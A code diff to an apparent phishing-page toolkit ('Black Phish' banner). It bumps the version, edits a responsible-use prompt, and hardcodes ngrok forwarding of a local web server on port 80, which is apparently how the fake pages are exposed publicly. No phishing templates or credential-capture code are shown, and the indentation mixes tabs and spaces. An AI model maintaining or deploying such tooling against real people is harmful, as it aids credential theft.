@@ -4,7 +4,7 @@
 # Please create pull request to support the tool
 # Please message us if you find any problems or ideas
 # Lasted updated: 1/26/20
-# version 3.2: - Bug fixes and improvements
+# version 3.3: - Bug fixes for ngrok
 # Please update version number each time we update
 
 
@@ -62,7 +62,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.2
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.3
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -78,13 +78,13 @@ def warning(): # Banner #
     warningchoice = input("                    Will you use this responsibly (\033[94;1my\033[93;1m/\033[91mn\033[93;1m): ") # Agreement Message #
 
     if warningchoice == 'y':
-        print("")
+        pass
     elif warningchoice == 'yes':
-	print("")
+	    pass
     elif warningchoice == 'Y':
-	print("")
+        pass
     elif warningchoice == 'Yes':
-	print("")
+	    pass
     else:
         endMessage()
 
@@ -279,29 +279,12 @@ def setup(template):
 
 # Port forward to ngrok #
 def ngrokForward():
-    # Set defaults
-    port = 80
-    method = "http"
-    des_method = input(yellow + "\nWould you like to use tcp or http as your method?[default http]: ").lower()
-    if not des_method:
-        pass
-    elif des_method == "tcp" or des_method == "http":
-        method = des_method
-    else:
-        print("[!] Method entered invalid, resorting to default method http")
-        sleep(2)
-    des_port = input(yellow + "\nPort[default 80]: ")
-    if des_port:
-        try:
-            port = int(des_port)
-        except ValueError:
-            print("[!] Port entered is not a number, resorting to default port 80")
-            sleep(2)
-    print("[!] Starting ngrok...")
-    print("[!]A new terminal will spawn with the ngrok links, you can use HTTP or HTTPS")
-    print("[!] Do not close out of the new terminal until you are finished")
     sleep(2)
-    system(f"gnome-terminal -q -- /bin/bash -c 'cd {cwd} && ./ngrok {method} {port}'")
+    try:
+        system(f"cd {cwd} && ./ngrok http 80")
+    except:
+        print(red + "\n[!] Something went wrong! Please try again")
+        endMessage()
 
 
 
@@ -359,7 +342,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.2
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.3
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
